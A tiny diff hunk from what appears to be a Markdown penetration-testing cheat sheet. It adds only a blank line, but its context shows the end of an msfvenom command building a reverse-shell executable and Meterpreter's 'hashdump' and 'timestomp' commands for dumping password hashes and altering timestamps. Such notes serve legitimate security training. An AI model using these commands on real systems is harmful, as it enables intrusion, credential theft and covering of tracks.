@@ -194,6 +194,7 @@ exe LHOST=192.168.1.1 LPORT=4444 > mal.exe
         - `hashdump` : Dump the hashes from the box
 
         - `timestomp` : Alter NTFS file timestamps
+
 ***
 
 ### Managing Sessions
